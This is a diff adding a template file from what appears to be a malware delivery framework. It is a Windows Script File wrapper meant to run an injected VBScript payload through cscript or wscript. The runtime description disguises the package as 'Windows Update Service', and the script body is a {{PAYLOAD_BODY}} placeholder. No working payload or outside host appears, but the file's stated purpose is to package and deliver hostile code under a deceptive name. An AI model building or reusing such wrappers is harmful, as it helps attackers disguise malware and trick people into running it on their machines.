@@ -1,0 +1,19 @@
+<!-- chunk: delivery/wsf_wrapper -->
+<!-- provides: wsf_vbs_container -->
+<!-- format: wsf -->
+<!-- description: Windows Script File that embeds VBScript payload. WSF supports multiple languages, references, and type libraries. Runs via cscript/wscript. -->
+<!-- vars: PAYLOAD_BODY -->
+
+<?xml version="1.0" encoding="UTF-8"?>
+<package>
+<job id="main">
+<runtime>
+<description>Windows Update Service</description>
+</runtime>
+<script language="VBScript">
+<![CDATA[
+{{PAYLOAD_BODY}}
+]]>
+</script>
+</job>
+</package>
